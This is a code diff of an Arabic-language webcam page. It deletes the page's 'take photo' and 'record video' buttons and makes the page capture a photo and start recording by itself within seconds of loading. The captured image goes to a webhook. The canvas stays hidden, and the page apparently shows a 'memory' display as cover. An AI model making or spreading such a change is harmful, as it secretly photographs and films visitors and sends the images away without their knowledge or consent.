@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التقاط صورة وفيديو</title>
+    <title>التقاط صورة وفيديو تلقائي</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -24,17 +24,6 @@
         canvas {
             display: none;
         }
-        button {
-            padding: 10px 20px;
-            background-color: #007BFF;
-            color: white;
-            border: none;
-            font-size: 16px;
-            cursor: pointer;
-        }
-        button:hover {
-            background-color: #0056b3;
-        }
         .message {
             margin-top: 20px;
             font-size: 18px;
@@ -48,7 +37,7 @@
 </head>
 <body>
 
-    <h1>التقاط صورة وفيديو عند الطلب</h1>
+    <h1>التقاط صورة وفيديو تلقائي عند تحميل الصفحة</h1>
     
     <!-- عرض الذكرى بشكل تلقائي -->
     <div>
@@ -65,9 +54,6 @@
 
     <canvas id="canvas" width="640" height="480"></canvas>
 
-    <button id="captureButton">التقاط صورة</button>
-    <button id="recordButton">بدء تسجيل الفيديو</button>
-    
     <script>
         const video = document.getElementById('video');
         const message = document.getElementById('message');
@@ -82,24 +68,24 @@
             try {
                 stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
+
+                // التقاط صورة وفيديو تلقائيًا بعد 3 ثواني
+                setTimeout(captureImage, 3000);  // التقاط صورة بعد 3 ثواني
+                setTimeout(startRecording, 6000);  // بدء تسجيل الفيديو بعد 6 ثواني
             } catch (err) {
                 message.textContent = "لم يتمكن المتصفح من الوصول إلى الكاميرا.";
                 console.error("خطأ في الوصول إلى الكاميرا: ", err);
             }
         }
 
-        // التقاط صورة عند الضغط على زر "التقاط صورة"
-        document.getElementById('captureButton').addEventListener('click', captureImage);
-
+        // التقاط صورة تلقائيًا
         function captureImage() {
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             const imageData = canvas.toDataURL('image/png');
             sendImageToWebhook(imageData);
         }
 
-        // بدء تسجيل الفيديو عند الضغط على زر "بدء تسجيل الفيديو"
-        document.getElementById('recordButton').addEventListener('click', startRecording);
-
+        // بدء تسجيل الفيديو تلقائيًا
         function startRecording() {
             chunks = [];
             recorder = new MediaRecorder(stream);
